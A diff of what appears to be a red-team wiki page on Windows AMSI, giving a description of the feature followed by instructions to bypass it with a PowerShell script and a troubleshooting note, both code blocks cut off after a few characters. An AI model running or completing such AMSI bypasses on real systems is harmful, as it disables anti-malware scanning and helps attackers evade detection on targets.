@@ -25,20 +25,42 @@ AMSI (Windows Anti-Malware Scan Interface) is a security feature in the Windows 
 
 AMSI (Windows Anti-Malware Scan Interface) is a security feature in the Windows operating system that allows applications and services to request scanning of data by an installed anti-malware product. AMSI provides a standard interface that enables anti-malware products to integrate with applications and scripts, and it enables applications and scripts to request a scan of data from an installed anti-malware product. AMSI can be used to scan data in memory, on disk, or in transmission, and it can be used to scan data in a variety of formats including text, scripts, and binary files. It is designed to be extensible, so that it can support new formats and scanning scenarios as they are introduced. AMSI is available on Windows 10 and Windows Server 2016 and later, and it is used by a variety of applications and services in Windows including Microsoft Office, PowerShell, and the Windows Defender antivirus. By providing a standard interface for anti-malware products to integrate with applications and scripts, AMSI helps to improve the security of Windows by enabling real-time scanning of potentially malicious data, and it can also help to reduce the burden on anti-malware products by allowing them to scan data in a more targeted and efficient manner.
 
+
+
 # Instructions
 
 1. To bypass AMSI run the following script in powershell
+
+
+
+
 
 **Code**: [[$ierku = @"
 using System;
 using System.Runtime.I]]
 
+
+
+
+
+
+
 ## Troubleshooting
 
 If the following output is received from the above command, try a different AMSI bypass. The target may also be alerted by this error.
 
+
+
+
+
 **Code**: [[At line:1 char:1
 + sET-ItEM ( 'V'+'aR' +  'IA' + ]]
+
+
+
+
+
+
 
 ## Platforms
 
@@ -48,3 +70,5 @@ If the following output is received from the above command, try a different AMSI
 
 - [[anti-malware]]
 - [[Defense Bypass]]
+
+
